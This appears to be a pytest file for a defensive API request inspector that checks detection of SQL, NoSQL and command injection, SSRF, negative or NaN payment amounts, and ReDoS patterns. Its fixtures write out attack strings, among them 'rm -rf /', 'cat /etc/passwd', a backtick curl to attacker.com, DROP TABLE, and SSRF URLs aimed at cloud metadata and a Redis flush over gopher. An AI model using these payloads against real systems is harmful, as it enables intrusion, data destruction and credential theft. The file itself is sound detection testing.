"""
Tests for Checkpoint 6: Deep Semantic Ingress Inspector (Sentinel-API Phase 2).
Validates:
1. InjectionInspector (Blind Spot #1 - OWASP API8: SQLi, NoSQLi, OS Command Injection)
2. SSRFInspector (Blind Spot #2 - OWASP API7: Cloud Metadata, Loopback, RFC1918, Non-HTTP Schemes)
3. BusinessLogicInspector (Blind Spot #3 - OWASP API3 / API6: Negative amounts, NaN/Inf, Duplicate array stuffing)
4. ComplexityAndReDoSInspector (Blind Spot #4 - OWASP API4: JSON depth > 10, evil regex backtracking patterns, latency anomalies)
5. DeepSemanticInspector master orchestrator execution SLA (< 1ms) and 0% false positive guarantee on benign inputs.
"""

import math
import time
import pytest
from person1_api_discovery.app.deep_inspector import (
    InjectionInspector,
    SSRFInspector,
    BusinessLogicInspector,
    ComplexityAndReDoSInspector,
    DeepSemanticInspector,
    deep_inspector
)


# =============================================================================
# 1. InjectionInspector Unit Tests (Blind Spot #1 - OWASP API8)
# =============================================================================

def test_sqli_detection():
    inspector = InjectionInspector()

    malicious_inputs = [
        "' OR 1=1 --",
        "swiggy' OR 'a'='a",
        "' UNION SELECT null, username, password FROM users --",
        "1; DROP TABLE accounts; --",
        "SELECT * FROM users; --",
        "admin' OR 2=2",
        "EXEC xp_cmdshell('dir')"
    ]

    for attack in malicious_inputs:
        findings = inspector.inspect_text(attack, "q")
        assert len(findings) > 0, f"Expected SQLi detection for: {attack}"
        indicator, owasp, severity, confidence, reason = findings[0]
        assert indicator == "SQL_INJECTION_DETECTED"
        assert "API8" in owasp
        assert severity == "CRITICAL"
        assert confidence >= 0.95


def test_sqli_benign_no_false_positive():
    inspector = InjectionInspector()

    benign_inputs = [
        "Swiggy Delivery",
        "O'Connor",         # Tricky Irish surname with apostrophe
        "D'Souza",          # Indian Goan surname with apostrophe
        "McDonald's",       # Fast food restaurant brand
        "don't fail me",    # Normal English contraction
        "Search query for user 1001",
        "order_id=ORD-9988-ABC",
        "user@example.com"
    ]

    for benign in benign_inputs:
        findings = inspector.inspect_text(benign, "q")
        assert len(findings) == 0, f"False positive SQLi triggered for benign input: '{benign}'"


def test_cmd_injection_detection():
    inspector = InjectionInspector()

    malicious_cmd_inputs = [
        "Swiggy; rm -rf /",
        "swiggy | cat /etc/passwd",
        "test & whoami",
        "param `curl http://attacker.com`",
        "value $(id)"
    ]

    for attack in malicious_cmd_inputs:
        findings = inspector.inspect_text(attack, "cmd")
        assert len(findings) > 0, f"Expected Command Injection detection for: {attack}"
        indicator, owasp, severity, _, _ = findings[0]
        assert indicator == "COMMAND_INJECTION_DETECTED"
        assert severity == "CRITICAL"


def test_nosqli_operator_detection():
    inspector = InjectionInspector()

    malicious_nosql_body = {
        "username": "admin",
        "password": {"$gt": ""}
    }
    findings = inspector.inspect_json(malicious_nosql_body)
    assert any(f[0] == "NOSQL_OPERATOR_INJECTION" for f in findings)
    assert any("$gt" in f[4] for f in findings)

    # Benign JSON body with legitimate fields
    benign_body = {
        "merchant": "Swiggy",
        "rating": 4.5,
        "tags": ["food", "fast-delivery"],
        "cost_inr": 250
    }
    benign_findings = inspector.inspect_json(benign_body)
    assert len(benign_findings) == 0


# =============================================================================
# 2. SSRFInspector Unit Tests (Blind Spot #2 - OWASP API7)
# =============================================================================

def test_ssrf_cloud_metadata():
    inspector = SSRFInspector()

    metadata_targets = [
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "169.254.169.254"
    ]

    for url in metadata_targets:
        is_ssrf, indicator, reason = inspector.is_ssrf_target(url)
        assert is_ssrf is True, f"Failed to detect cloud metadata SSRF: {url}"
        assert indicator == "SSRF_CLOUD_METADATA"


def test_ssrf_loopback_and_private_networks():
    inspector = SSRFInspector()

    internal_targets = [
        ("http://127.0.0.1:8000/api/internal/config/env", "SSRF_LOOPBACK_TARGET"),
        ("http://localhost:3000/admin", "SSRF_LOOPBACK_TARGET"),
        ("http://[::1]:8080/metrics", "SSRF_LOOPBACK_TARGET"),
        ("http://10.0.1.55:8080/cluster", "SSRF_PRIVATE_NETWORK"),
        ("http://172.16.4.1/secret", "SSRF_PRIVATE_NETWORK"),
        ("http://192.168.1.1/admin", "SSRF_PRIVATE_NETWORK"),
        ("http://vault.corp.local/v1/keys", "SSRF_PRIVATE_NETWORK")
    ]

    for url, expected_ind in internal_targets:
        is_ssrf, indicator, _ = inspector.is_ssrf_target(url)
        assert is_ssrf is True, f"Failed to detect internal SSRF target: {url}"
        assert indicator == expected_ind


def test_ssrf_unsafe_schemes():
    inspector = SSRFInspector()

    unsafe_schemes = [
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_flushall",
        "dict://127.0.0.1:11211/stat",
        "ftp://internal-storage/dump.sql"
    ]

    for url in unsafe_schemes:
        is_ssrf, indicator, _ = inspector.is_ssrf_target(url)
        assert is_ssrf is True, f"Failed to detect unsafe scheme: {url}"
        assert indicator == "SSRF_UNSAFE_SCHEME"


def test_ssrf_benign_urls():
    inspector = SSRFInspector()

    benign_urls = [
        "https://cdn.examplebank.in/avatars/user1.png",
        "https://images.unsplash.com/photo-12345",
        "https://api.github.com/users/alice",
        "https://fastapi.tiangolo.com/tutorial/"
    ]

    for url in benign_urls:
        is_ssrf, _, _ = inspector.is_ssrf_target(url)
        assert is_ssrf is False, f"False positive SSRF flagged on benign URL: {url}"


# =============================================================================
# 3. BusinessLogicInspector Unit Tests (Blind Spot #3 - OWASP API3 / API6)
# =============================================================================

def test_negative_financial_amount_exploit():
    inspector = BusinessLogicInspector()

    body = {
        "recipient_vpa": "merchant@bharatpay",
        "amount": -5000.0,
        "note": "Payment refund exploit"
    }

    findings = inspector.inspect({}, body)
    assert any(f[0] == "NEGATIVE_AMOUNT_EXPLOIT" for f in findings)
    assert any("Negative financial value (-5000.0)" in f[4] for f in findings)


def test_nan_inf_financial_exploit():
    inspector = BusinessLogicInspector()

    body_nan = {"amount": float("nan")}
    findings_nan = inspector.inspect({}, body_nan)
    assert any(f[0] == "ARITHMETIC_NAN_INF_EXPLOIT" for f in findings_nan)

    body_inf = {"transfer_value": float("inf")}
    findings_inf = inspector.inspect({}, body_inf)
    assert any(f[0] == "ARITHMETIC_NAN_INF_EXPLOIT" for f in findings_inf)


def test_duplicate_array_stuffing():
    inspector = BusinessLogicInspector()

    body = {
        "recipient_vpa": "merchant@upi",
        "amount": 250.0,
        "coupons": ["SAVE10", "SAVE10", "SAVE10"]
    }

    findings = inspector.inspect({}, body)
    assert any(f[0] == "DUPLICATE_ARRAY_STUFFING" for f in findings)
    assert any("SAVE10" in f[4] for f in findings)


def test_business_logic_benign():
    inspector = BusinessLogicInspector()

    benign_body = {
        "recipient_vpa": "retailer@upi",
        "amount": 1250.0,
        "coupons": ["SAVE10", "WELCOME50"],
        "note": "Dinner bill split"
    }

    findings = inspector.inspect({"amount": "1250.0"}, benign_body)
    assert len(findings) == 0


# =============================================================================
# 4. ComplexityAndReDoSInspector Unit Tests (Blind Spot #4 - OWASP API4)
# =============================================================================

def test_excessive_json_depth():
    inspector = ComplexityAndReDoSInspector()

    # Build deeply nested dictionary of depth 14
    deep_body = {"key": "val"}
    for _ in range(14):
        deep_body = {"nested": deep_body}

    depth = inspector.calculate_json_depth(deep_body)
    assert depth > 10

    findings = inspector.inspect("", deep_body, latency_ms=10.0)
    assert any(f[0] == "EXCESSIVE_JSON_DEPTH" for f in findings)
    assert any("exceeds safe maximum" in f[4] for f in findings)


def test_redos_pattern_detection():
    inspector = ComplexityAndReDoSInspector()

    evil_patterns = [
        "(a+)+$!",
        "((a*)*)*",
        "([a-z]+)+",
        "(abc+){2,}"
    ]

    for evil in evil_patterns:
        findings = inspector.inspect(evil, {"filter": evil}, latency_ms=5.0)
        assert any(f[0] == "REDOS_PATTERN_DETECTED" for f in findings), f"Failed to detect ReDoS: {evil}"


def test_complexity_benign():
    inspector = ComplexityAndReDoSInspector()

    normal_body = {
        "statement": {
            "account_id": "ACC-1001",
            "month": "October",
            "year": 2026
        }
    }

    findings = inspector.inspect('{"statement": {"account_id": "ACC-1001"}}', normal_body, latency_ms=12.0)
    assert len(findings) == 0


# =============================================================================
# 5. Master DeepSemanticInspector & Execution SLA (< 1ms)
# =============================================================================

def test_master_deep_inspector_sla_and_orchestration():
    inspector = DeepSemanticInspector()

    # Composite malicious request
    q_params = {"q": "' OR 1=1 --"}
    body = {
        "amount": -2000,
        "avatar_url": "http://169.254.169.254/latest/meta-data/"
    }

    result = inspector.inspect_request(q_params, parsed_body=body)
    assert result.is_threat is True
    assert "SQL_INJECTION_DETECTED" in result.threat_indicators
    assert "NEGATIVE_AMOUNT_EXPLOIT" in result.threat_indicators
    assert "SSRF_CLOUD_METADATA" in result.threat_indicators
    assert result.severity == "CRITICAL"
    assert result.execution_latency_ms < 5.0  # Well within tight sub-millisecond envelope

    # Benign request benchmark - performance SLA
    benign_params = {"q": "Swiggy O'Connor"}
    benign_body = {
        "amount": 499.0,
        "avatar_url": "https://cdn.examplebank.in/avatars/user1.png",
        "coupons": ["SAVE10", "FLAT20"]
    }

    # Warmup
    _ = inspector.inspect_request(benign_params, parsed_body=benign_body)

    # Benchmark SLA over 100 runs
    times = []
    for _ in range(100):
        t_start = time.perf_counter()
        benign_res = inspector.inspect_request(benign_params, parsed_body=benign_body)
        times.append((time.perf_counter() - t_start) * 1000.0)
        assert benign_res.is_threat is False
        assert len(benign_res.threat_indicators) == 0

    avg_ms = sum(times) / len(times)
    assert avg_ms < 1.0, f"Average inspection SLA must be < 1ms, got {avg_ms:.4f}ms"
